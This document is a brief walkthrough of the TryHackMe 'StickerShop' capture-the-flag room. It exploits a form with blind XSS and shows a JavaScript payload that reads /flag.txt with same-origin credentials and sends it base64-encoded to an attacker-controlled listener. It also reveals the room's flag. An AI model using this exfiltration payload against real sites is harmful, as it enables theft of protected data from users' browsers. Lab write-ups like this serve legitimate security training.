# StickerShop CTF - TryHackMe Room
# **!! SPOILERS !!**
#### This repository documents my walkthrough for the **StickerShop** CTF challenge on [TryHackMe](https://tryhackme.com/r/room/thestickershop). 
---
We know that flag is located in `http://SITE_IP:8080/flag.txt`

![web](imgs/web.png "web")

Strting python server

```
python3 -m http.server 80
```
Testing the form for XSS with simple code in JS

```javascript
<script src="http://MY_MACHINE_IP:80/test"></script>
```

We captured response

![py1](imgs/py1.png "py1")

Modifying the script to obtain `flag.txt`

```JavaScript
<script>
fetch("/flag.txt", {method:'GET',mode:'no-cors',credentials:'same-origin'})
  .then(response => response.text())
  .then(text => { 
    fetch('http://MY_MACHINE_IP:80/' + btoa(text), {mode:'no-cors'}); 
  });
</script>

```

![py2](imgs/py2.png "py2")

Now we need to decode this weird string `VEhNezgzNzg5YTY5MDc0ZjYzNmY2NGEzODg3OWNmY2FiZThiNjIzMDVlZTZ9` from base64

The flag is: `THM{83789a69074f636f64a38879cfcabe8b62305ee6}`

# FLAG OBTAINED
